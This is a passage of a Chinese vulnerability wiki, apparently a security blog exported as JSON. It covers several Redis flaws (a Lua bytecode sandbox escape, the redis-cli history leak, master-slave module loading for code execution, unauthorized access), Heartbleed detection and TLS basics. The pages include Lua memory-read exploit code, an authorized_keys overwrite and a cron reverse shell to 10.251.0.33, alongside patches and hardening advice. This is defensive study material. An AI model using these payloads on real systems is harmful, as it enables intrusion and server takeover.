(e_lo + e_hi) e = (e - (e % 2)) / 2 m = x / 2^e if m &lt; 0.5 then e_hi = e elseif 1 &lt;= m then e_lo = e else break end end if e+1023 &lt;= 1 then m = m * 2^(e+1074) e = 0 else m = (m - 0.5) * 2^53 e = e + 1022 end local lo = m % 2^32 m = (m - lo) / 2^32 local hi = m + e * 2^20 return lo, hiendii2f = function(lo, hi) -- Convert uint32_t[2] to double local m = hi % 2^20 local e = (hi - m) / 2^20 m = m * 2^32 + lo if e ~= 0 then m = m + 2^52 else e = 1 end return m * 2^(e-1075)endread_mem = loadstring(string.dump(function(mem_addr) -- AAAABBBB 1094795585 1111638594 local magic=nil local function middle() local f2ii, asnum = f2ii, asnum local lud, upval local function inner() magic = &quot;01234567&quot; local lo,hi = f2ii(mem_addr) upval = &quot;commonhead16bits&quot;..ub4(lo)..ub4(hi) lo,hi = f2ii(asnum(upval));lo = lo+24 magic = magic..ub4(lo)..ub4(hi)..ub4(lo)..ub4(hi) end inner() return asnum(magic) end magic = middle() return magicend):gsub(&quot;(\\164%z%z%z)....&quot;, &quot;%1\\0\\0\\128\\1&quot;, 1)) --&gt; move 0,3x=&quot;AAAABBBB&quot;l,h=f2ii(asnum(x))x=ii2f(l+24,h)print(f2ii(read_mem(x))) 补丁分析​ 漏洞是因为加载字节码导致的，Redis中的修复，直接禁止字节码加载： 流量分析​ 直接eval命令发lua字节码脚本 参考资料 http://redis.io/commands/ZADD http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/ https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411 https://github.com/viruscamp/luadec https://juejin.cn/post/6844903572673396750 https://gist.github.com/corsix/6575486 https://www.bbsmax.com/A/mo5kZWW2Jw/","tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"Redis","slug":"漏洞相关/Redis","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"}]},{"title":"CVE-2013-7458_Redis redis-cli信息泄露漏洞","date":"2021-07-06T08:13:34.000Z","path":"wiki/漏洞相关/Redis/CVE-2013-7458-Redis-redis-cli信息泄露漏洞/","text":"漏洞信息漏洞简介 漏洞名称：Redis redis-cli信息泄露漏洞 漏洞编号：CVE-2013-7458 漏洞类型：信息泄露 CVSS评分：【CVSS v2.0：】【CVSS v3.0：3.3】 漏洞危害等级：低危 组件概述​ Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 ​ 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 漏洞概述​ Redis redis-cli中存在本地信息泄露漏洞，该漏洞源于程序设置.rediscli_history文件为全局可读。攻击者可利用该漏洞获取敏感信息。 漏洞利用条件​ 攻击者先需要获取redis-server所在服务器的低权限用户。 漏洞影响​ Redis: 3.2.2 漏洞复现漏洞复现​ 本地使用redis-cli连接redis-server 1redis-cli ​ 随便输入一些命令 1234127.0.0.1:6379&gt; config get client-output-buffer-limit1) &quot;client-output-buffer-limit&quot;2) &quot;normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60&quot;127.0.0.1:6379&gt;info ​ 退出redis-cli，用本地用户切换到/home路径下，查看.rediscli_history文件，此文件记录了redis-cli的一系列操作。 ​ 文件末尾包括刚刚执行的命令。 漏洞分析技术背景包含头文件: /#include &lt;sys/stat.h&gt; /#include &lt;sys/types.h&gt; 函数: 函数原型： int mkdir(const char *pathname, mode_t mode); 函数说明： mkdir()函数以mode方式创建一个以参数pathname命名的目录，mode定义新创建目录的权限。 返回值： 若目录创建成功，则返回0；否则返回-1，并将错误记录到全局变量errno中。 模式类型: mode方式： S_IRWXU 00700权限，代表该文件所有者拥有读，写和执行操作的权限S_IRUSR(S_IREAD) 00400权限，代表该文件所有者拥有可读的权限S_IWUSR(S_IWRITE) 00200权限，代表该文件所有者拥有可写的权限S_IXUSR(S_IEXEC) 00100权限，代表该文件所有者拥有执行的权限S_IRWXG 00070权限，代表该文件用户组拥有读，写和执行操作的权限S_IRGRP 00040权限，代表该文件用户组拥有可读的权限S_IWGRP 00020权限，代表该文件用户组拥有可写的权限S_IXGRP 00010权限，代表该文件用户组拥有执行的权限S_IRWXO 00007权限，代表其他用户拥有读，写和执行操作的权限S_IROTH 00004权限，代表其他用户拥有可读的权限S_IWOTH 00002权限，代表其他用户拥有可写的权限S_IXOTH 00001权限，代表其他用户拥有执行的权限 Demo:12345int isCreate = mkdir(path,S_IRUSR | S_IWUSR | S_IXUSR | S_IRWXG | S_IRWXO);if( !isCreate )printf(&quot;create path:%s\\n&quot;,path);elseprintf(&quot;create path failed! error code : %s \\n&quot;,isCreate,path); 详细分析代码分析​ 如果.rediscli_history文件不存在，则使用默认的umask 0022创建该文件，因此该文件的权限为0644。 ​ redis-cli会将其历史记录默认写入~路径下，通常载/home中的文件夹，默认情况下，该文件夹可以在被其他用户读取，因为权限为0644，如上图所示。 ​ 在/deps/linenoise/linenoise.c文件中linenoiseHistorySave的函数，作用为创建一个文件，写入历史记录并保存。 ​ /src/redis-cli.c文件的repl函数，调用了linenoiseHistorySave，来保存历史命令，创建.rediscli_history文件，没有考虑权限分配，默认umask为0022，故创建出一个权限为0644的.rediscli_history文件 补丁分析​ 在/deps/linenoise/linenoise.c文件中linenoiseHistorySave函数中增加，umask设置 ​ 打开文件前先进行权限掩码设置： ​ S_IWUSR 00200权限，代表该文件所有者拥有可写的权限， S_IRWXG 00070权限，代表该文件用户组拥有读，写和执行操作的权限，S_IRWXO 00007权限，代表其他用户拥有读，写和执行操作的权限。 ​ 写入数据后，更改文件权限（chmod）为 S_IRUSR 00400权限，代表该文件所有者拥有可读的权限， S_IWUSR(S_IWRITE) 00200权限，代表该文件所有者拥有可写的权限，其他组和其他用户无任何权限。 参考资料 http://www.openwall.com/lists/oss-security/2016/07/28/10 https://github.com/antirez/redis/pull/1418","tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"Redis","slug":"漏洞相关/Redis","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"}]},{"title":"Redis主从复制代码执行漏洞","date":"2021-07-06T08:02:31.000Z","path":"wiki/漏洞相关/Redis/Redis主从复制代码执行漏洞/","text":"漏洞信息漏洞简介 漏洞名称：Redis Replication代码执行漏洞 漏洞编号：CNVD-2020-21479 漏洞类型：代码执行 CVSS评分：【CVSS v2.0：】【CVSS v3.0：】 漏洞危害等级：高危 组件概述​ Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 ​ 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 漏洞概述​ Redis Replication存在代码执行漏洞，该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。攻击者可利用漏洞执行任意代码。 由于Redis 4.x以及之后的版本，Redis新增了模块功能，用户可以通过外部拓展实现用户需要的功能，这样就可以在Redis中实现一个新的Redis命令。攻击者可以利用此功能（由Redis的主机实例通过fullresync同步到从机），使被攻击机加载恶意的模块.so文件，从而实现远程命令执行。 漏洞利用条件1、Redis配置了空密码或者弱密码 2、Redis配置文件中bind绑定0.0.0.0 127.0.0.1或者被注释 3、Redis解除保护模式，可以在配置文件将protected-mode，设置为no 1protected-mode no 或者，启动redis-server后，在redis-cli中输入命令，临时关闭保护模式 1CONFIG SET protected-mode no 3、Redis配置 /var/lib/redis/dump.rdb是slave服务器默认的保存路径，没有保存这个文件的文件夹，创建相应文件夹，给redis用户权限，或者直接运行在root权限下 攻击者可以远程连接到以上配置的redis，并执行命令。 漏洞影响redis 4.x redis 5.x 漏洞修复https://download.redis.io/releases/ 漏洞复现环境拓扑10.251.0.33 （kali，master）——————————————————————————-&gt; 10.251.0.36（Redis-server，slave） 主从关系，攻击机为master，靶机为slave。 应用协议6379/RESP（Redis的序列化协议） 漏洞复现启动靶机10.251.0.36的redis-server（slave） 1redis-server 在攻击机Kali 10.251.0.33，本地编译一个恶意的exp.so 12cd RedisModulesSDK/exp/make https://github.com/RicterZ/RedisModules-ExecuteCommand 启动攻击机的redis-server（master），并执行模拟的redis-cli程序，发送恶意命令，既执行redis-rogue-server.py 1python3 redis-rogue-server.py --rhost 10.251.0.36 --lhost 10.251.0.33 执行前，先检查攻击机的redis-server（master）和靶机redis-server（slave）的保护模式是否都关闭了，若未关闭，被执行命令的redis服务器会报错 在攻击机运行redis-cli，关闭保护模式 在靶机上运行redis-cli，关闭保护模式 启动攻击机的redis-server（master），并执行redis-rogue-server.py 1python3 redis-rogue-server.py --rhost 10.251.0.36 --lhost 10.251.0.33 执行后靶机报错，权限不足 Redis主从文件权限问题 问题：Opening the temp file needed for MASTER &lt;-&gt; SLAVE synchronization: Permission denied 通过日志看出来是同步文件权限的问题 问题是dump.rdb文件已经成功从master复制的到了slave服务器 /var/lib/redis/dump.rdb是slave服务器默认的保存路径，没有保存这个文件的文件夹，创建相应文件夹，给redis用户权限，靶机redis-server运行在普通用户权限，无法加载.so运行，为了复现顺利，故以root权限运行redis-server 1sudo redis-server 再次执行redis-rogue-server.py 1python3 redis-rogue-server.py --rhost 10.251.0.36 --lhost 10.251.0.33 靶机redis-server信息台打印出加载.so成功的信息 看一下攻击机kali 的redis-server（master）的控制台信息，发现主从配置成功 攻击机kali，redis-rogue-server信息台输出，shell接口，输入id返回ID信息（信息编码问题） 从数据包中可以看到id被执行成功后，返回的信息 可以看一下执行命令后的主从关系，攻击机为master 靶机为slave ps： 修改了默认的配置文件后，直接启动redis，新的配置文件是不生效的，所以必须指定配置文件路径的方式来启动： 1./redis-server /usr/local/redis-4.0.0/redis.conf 漏洞分析技术背景Redis命令与RESP协议​ Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 ​ 例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录： 123SET 1234 TESTGETSET 1234 TEST2GET 1234 ​ 有关Redis命令的完整列表，请参考 http://redis.io/commands ​ Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 http://redis.io/topics/protocol获得该协议详细说明。 RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识： 简单字符串以“ +”字符开头 错误以“-”字符开头 整数以“：”字符开头 批量字符串以“ $”字符开头 数组以“ *”字符开头 ​ 批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串： 12$7 CRLFTELUS ​ 其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 ​ RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组： 12345*2 CRLF$7 CRLFSangfor CRLF$4 CRLFTEST CRLF ​ 所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送： 1234567*3 CRLF$3 CRLFSET CRLF$4 CRLF1234 CRLF$4 CRLFTEST CRLF Redis主从复制​ 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点（master），后者称为从节点（slave）；数据的复制是单向的，只能由主节点到从节点。 ​ 默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点（或没有从节点），但一个从节点只能有一个主节点。 ​ 主从复制的作用主要包括： 数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。 故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。 负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。 高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。 如何使用主从复制 建立复制 需要注意，主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。 从节点开启主从复制，有3种方式： （1）配置文件 在从服务器的配置文件中加入： 1slaveof &lt;masterip&gt; &lt;masterport&gt; （2）启动命令 redis-server启动命令后加入 1redis-server --slaveof &lt;masterip&gt; &lt;masterport&gt; （3）客户端命令 Redis服务器启动后，直接通过redis-cli客户端执行命令，则该Redis实例成为从节点。 1slaveof &lt;masterip&gt; &lt;masterport&gt; 以上3种方式是等效的，下面以客户端命令的方式为例，看一下当执行了slaveof后，Redis主节点和从节点的变化。 实例 通过以上3种方式的任意一种，建立主从关系，实例中10.251.0.33为主节点（master），10.251.0.36为从节点（slave） 下面验证一下，在主从复制建立后，主节点的数据会复制到从节点中。 （1）首先在从节点，查询一个不存在的key： （2）然后在主节点中增加这个key： （3）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点： （4）然后在主节点删除这个key： （5）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点： 断开复制 1slaveof &lt;masterip&gt; &lt;masterport&gt; 命令建立主从复制关系以后，可以通过命令断开 1slaveof no one 需要注意的是，从节点断开复制后，不会删除已有的数据，只是不再接受主节点新的数据变化。 详细分析漏洞利用过程攻击者连接到远程无密码或者弱密码的redis-server，执行slaveof命令，使redis服务器成为攻击者的slave机器，然后攻击者在本地编译一个恶意.so文件，利用外部模块扩展Redis功能这个特性，再配合主从复制机制传送到目标机器，之后注入远程命令调用.so，执行恶意操作。 代码分析此漏洞利用的是redis的特性 流量分析​ 攻击包为RESP协议，Redis默认监听在6379，使用Redis命令，Redis命令详解请看 3.1技术背景。 参考资料 https://redis.io/commands/slaveof https://github.com/RicterZ/RedisModules-ExecuteCommand https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf","tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"Redis","slug":"漏洞相关/Redis","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"}]},{"title":"Redis未授权访问漏洞","date":"2021-07-06T07:57:13.000Z","path":"wiki/漏洞相关/Redis/Redis未授权访问漏洞/","text":"漏洞信息漏洞简介 漏洞名称：Redis未授权访问漏洞 漏洞编号：CNVD-2015-07557 漏洞类型：未授权访问 CVSS评分：【CVSS v2.0：】【CVSS v3.0：】 漏洞危害等级：高危 组件概述​ Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 ​ 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 漏洞概述​ Redis存在非授权访问漏洞，Redis服务默认对外开放6379端口，任意匿名用户可以连接登录。 ​ Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。 漏洞利用条件1、Redis配置了空密码或者弱密码 2、Redis配置文件中bind绑定0.0.0.0 127.0.0.1或者被注释 3、Redis解除保护模式，可以在配置文件将protected-mode，设置为no 1protected-mode no 或者，启动redis-server后，在redis-cli中输入命令，临时关闭保护模式 1CONFIG SET protected-mode no 漏洞复现应用协议6379/RESP 漏洞复现Redis未授权访问获取敏感信息 redis在开放往外网的情况下，默认配置下是空口令，端口为6379，连接后可以获取Redis敏感数据。 ​ kali攻击机输入以下命令，获取靶机的敏感信息： 12redis-cli -h 10.251.0.36info 写入ssh公钥，获取操作系统权限​ 原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，可以在服务器端的/root/.ssh下生一个授权的key。 首先在攻击机上生成key： 1ssh-keygen -t rsa ​ 生成的公钥key 将公钥导入key.txt文件（前后用\\n换行，避免和Redis里其他缓存数据混合）,再把key.txt文件内容写入目标主机的缓冲里： 1(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt 1cat /root/.ssh/key.txt | ./redis-cli -h 192.168.10.153 -x set xxx 连接目标主机的Redis，设置redis的公钥key备份路径为/root/.ssh和保存文件名authorized_keys，将key.txt数据保存在服务器上： 123config set dir /root/.sshconfig set dbfilename authorized_keyssave 用攻击机ssh远程连接靶机，不用密码就可以直接远程登录ssh： 12ssh 10.251.0.35ifconfig 可以在靶机，进入/root/.ssh目录，看一下authorized_keys的文件内容 1cat /root/.ssh/authorized_keys 利用计划任务执行命令反弹shell先在攻击机上监听一个端口 1nc -nvlp 666 123456789root@kali:~# redis-cli -h 10.251.0.3610.251.0.35:6379&gt; set exp &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/10.251.0.33/666 0&gt;&amp;1\\n&quot;OK10.251.0.35:6379&gt; config set dir /var/spool/cron/OK10.251.0.35:6379&gt; config set dbfilename rootOK10.251.0.35:6379&gt; saveOK 靶机的/var/spool/cron路径下，有root文件 多次尝试后，等一段时间，反弹shell成功： 技术背景​ Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 ​ 例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录： 123SET 1234 TESTGETSET 1234 TEST2GET 1234 ​ 有关Redis命令的完整列表，请参考 http://redis.io/commands ​ Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 http://redis.io/topics/protocol获得该协议详细说明。 RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识： 简单字符串以“ +”字符开头 错误以“-”字符开头 整数以“：”字符开头 批量字符串以“ $”字符开头 数组以“ *”字符开头 ​ 批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串： 12$7 CRLFTELUS ​ 其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 ​ RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组： 12345*2 CRLF$7 CRLFSangfor CRLF$4 CRLFTEST CRLF ​ 所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送： 1234567*3 CRLF$3 CRLFSET CRLF$4 CRLF1234 CRLF$4 CRLFTEST CRLF 漏洞利用过程​ Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。 漏洞修复1.禁止一些高危命令（重启redis才能生效） 修改 redis.conf 文件，禁用远程修改 DB 文件地址 123rename-command FLUSHALL &quot;&quot;rename-command CONFIG &quot;&quot;rename-command EVAL &quot;&quot; 或者通过修改redis.conf文件，改变这些高危命令的名称 123rename-command FLUSHALL &quot;name1&quot;rename-command CONFIG &quot;name2&quot;rename-command EVAL &quot;name3&quot; 2. 以低权限运行 Redis 服务（重启redis才能生效） 为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆 1groupadd -r redis &amp;&amp; useradd -r -g redis redis 3. 为 Redis 添加密码验证（重启redis才能生效） 修改 redis.conf 文件，添加 1requirepass mypassword （注意redis不要用-a参数，明文输入密码，连接后使用auth认证） 4. 禁止外网访问 Redis（重启redis才能生效） 修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用 1bind 127.0.0.1 在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错 5. 修改默认端口 修改配置文件redis.conf文件 1Port 6379 默认端口是6379，可以改变成其他端口（不要冲突就好） 6. 保证 authorized_keys 文件的安全 为了保证安全，您应该阻止其他用户添加新的公钥。 将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限： 1chmod 400 ~/.ssh/authorized_keys 为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限: 1chattr +i ~/.ssh/authorized_keys 然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限： 1chattr +i ~/.ssh 7. 设置防火墙策略 如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。 参考资料 https://www.freebuf.com/column/158065.html","tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"Redis","slug":"漏洞相关/Redis","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"}]},{"title":"CVE-2014-0160_OpenSSL心脏滴血漏洞","date":"2021-07-06T06:59:47.000Z","path":"wiki/漏洞相关/OpenSSL/CVE-2014-0160-OpenSSL心脏滴血漏洞/","text":"​ OpenSSL是为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议。OpenSSL 1.0.1中的TLS和DTLS在实现上没有严格处理Heartbeat扩展包，心跳处理逻辑没有检测心跳包中的长度字段是否和后续的数据字段相符合，用此漏洞攻击者可以通过特制的数据包触发缓冲区溢出读操作，获得通信中的敏感信息。允许攻击者从内存中读取多达64KB的数据。 漏洞触发​ OpenSSL心脏滴血（CVE-2014-0160），存在于含有心跳扩展机制的TLS版本：TLSv1.0（0x0301），TLSv1.1（0x0302），TLSv1.2（0x0303）三种版本中。 ​ 此漏洞主要通过攻击者模拟向服务器端发送自己编写的Heartbeat心跳数据包，主要是Heartbeat Message的长度与payload length进行匹配，若payload lenght长度大于HeartbeatMes sage的length，则会在服务器返回的response响应包中产生数据溢出，造成有用数据泄露。 TLS数据包格式 心跳包字段 长度 说明 ContentType 1byte 心跳包类型，IANA组织把type编号定义为24（0x18） ProtocolVersion 2bytes TLS的版本号，目前主要包括含有心跳扩展的TLS版本：TLSv1.0，TLSv1.1，TLSv1.2 length 2bytes HeartbeatMessage的长度 HeartbeatMessageType 1byte Heartbeat类型 01表示heartbeat_request 02表示heartbeat_response payload_length 2bytes payload长度 payload payload_length个bytes payload的具体内容 padding &gt;=16bytes padding填充，最少为16个字节 ​ 如下图所示，心跳包标识（\\x18），SSL协议标识（\\x03\\x03），Heartbeat Message的length为3字节（\\x00\\x03），而请求数据字段（payload length）的值为65535字节（\\xff\\xff），有可能存在攻击，因为攻击者想获得更多的信息，所以一般请求数据长度（payload length）设置为最大值65535（\\xff\\xff），而且wireshark一般会对畸形心跳包进行标识，显示此Heartbeat Request数据包的payload length异常。 攻击流程示例心跳请求包 ​ 攻击者发送特征的心跳请求包，是只设置了payload length，但是没有payload数据。Heartbeat Message的length为3字节（\\x00\\x03）说明没有payload数据，而请求数据字段（payload length）的值为16384字节（\\x40\\x00），说明请求服务器返回16384字节长度的心跳返回包数据。而且wireshark一般会对畸形心跳包进行标识，显示此Heartbeat Request数据包的payload length异常。 心跳响应包 ​ 受漏洞影响的服务器一般会返回，攻击者发送的心跳请求包的请求数据字段（payload length）相同大小的数据，此次为16384字节。可以看到泄漏的数据为16384字节。 检测思路​ OpenSSL心脏滴血（CVE-2014-0160）一般的检测思路是从泄漏角度来判断匹配的是心跳响应数据包，一般返回的心跳包不会很大，如果超过返回的心跳数据大于16384字节，可能在泄漏内存数据。但是存在一种加密的心跳响应数据包，虽然TLS协议已经规定TLSCiphertext.fragment 的长度（以字节为单位）不能超过2^14 + 2048（16384 + 2048字节长度）。但是，实际的部分场景中存在，加密心跳响应数据包的长度超过规定值，所以存在误报。 ​ 由于心跳数据包被加密如果攻击者无主密钥也无法解密。一般明文的心跳数据包，误报的可能性较低。 ​ 另一种检测思路是从心跳请求包角度来判断，不仅判断心跳请求包长度（length），并且对请求数据长度字段值（payload length）大小判断，可信度较高，误报可能性较低。 判断总结 OpenSSL心脏滴血（CVE-2014-0160）的产生主要由于OpenSSL的心跳处理逻辑没有检测心跳包中的长度字段（payload length）是否和后续实际的数据内容长度（payload）相对应，导致攻击者构造异常数据包，来直接获取心跳数据所在的内存区域的后续数据。主要特征有： heartbleed漏洞主要存在于有心跳机制的OpenSSL协议中。 IANA组织把开启心跳扩展机制的SSL数据包type类型定义为24（0x18）。 heartbleed漏洞主要存在于TLS和DTLS两种协议中，在含有heartbleed漏洞的OpenSSL协议中需要开启心跳扩展机制（beartbeat），而含有心跳扩展机制的TLS版本主要包含在TLSv1.0（0x0301），TLSv1.1（0x0302），TLSv1.2（0x0303）三种版本中。 heartbleed漏洞攻击主要由于攻击者构造异常的心跳数据包，即心跳包中的长度字段（payload length）与后续实际的数据内容长度（payload）不相符合，来获取心跳数据所在的内存区域的后续数据。 ​ 综上所述我们可以通过对线网中的数据首先进行判断是否为含有OpenSSL的数据包，同时通过对数据包中的type类型判断数据包是否为心跳数据包（\\x18），然后对TLS的版本进行匹配找到相应的含有心跳扩展机制的心跳数据包，最后通过对心跳包中的实际数据长度（payload）与长度字段（payload length）定义的值比较，如果心跳包中的与后续实际的数据内容长度（payload）小于定义的长度字段（payload length）则该数据包即为含有heartbleed漏洞的数据包。","tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"http://example.com/tags/OpenSSL/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"OpenSSL","slug":"漏洞相关/OpenSSL","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/"}]},{"title":"CVE-2014-0224_OpenSSL中间人漏洞","date":"2021-07-06T06:54:14.000Z","path":"wiki/漏洞相关/OpenSSL/CVE-2014-0224-OpenSSL中间人漏洞/","text":"SSL/TLS协议简介安全套接字层（SSL）和传输层安全性（TLS）是加密协议，通过TCP/IP网络进行的通信提供安全的身份验证和数据完整性。 通过使用如对称密钥密码，加密安全哈希函数以及非对称加密/解密和身份验证的公钥基础结构之类的加密原语，这些协议使主机能够在不安全的网络上，建立安全信道。 TLS 1.1和TLS 1.2 是IETF标准，并且是对TLS 1.0的改进，而TLS 1.0本身是Netscape开发的SSL协议（版本3.0）的标准化后继版本。 TLS是一个分层协议。 两个端点之间交换的所有数据都包含在TLS记录内，TLS记录是协议堆栈的最底层。 TLS结构如下： 123456Offset Length Content---------------------------------------0x00 1 Record Type0x01 2 Record Version0x03 2 Length of Record Data (n)0x05 n Record Data TLS是按big-endian字节顺序排列。 不同版本的SSL的Record Version对应如下： 1234\\x03\\x00 //SSL 3.0\\x03\\x01 //TLS 1.0\\x03\\x02 //TLS 1.1\\x03\\x03 //TLS 1.2 注意，在大多数应用程序中，默认情况下SSL 2.0没有Record层，已被弃用并禁用。 TLS支持几种记录类型（Record Type）： 包括握手协议（\\x16），更改密码规范协议（\\x14），警报协议（\\x15）和应用程序数据协议（\\x17）。 客户端和服务器使用握手协议来协商通用密钥，交换密钥数据并验证握手过程的完整性。 更改密码规范协议（\\x14）消息用于初始化两端的密码。 建立TLS会话后，所有TLS消息的记录数据（Record Data）部分都会使用协商密钥加密。 握手协议的记录数据（Record Data）字段具有以下格式： 12345Offset Length Content---------------------------------------0x00 1 Handshake Type0x01 3 Length (n)0x04 n Handshake Data 存在几种类型的握手消息类型（Handshake Type），包括Client Hello（\\x01），Server Hello（\\x02），Hello Verify Request（\\ x03），Certificate（\\ x0b），Server Hello Done（\\ x0e），Client Key Exchange（\\ x10） ，Finished（\\ x14）等， 每个都有自己的结构。 注：Change Cipher Spec 消息具有记录类型（\\x14），记录数据长度（\\x01）和记录数据（\\x01），这是固定消息。 TLS 握手： 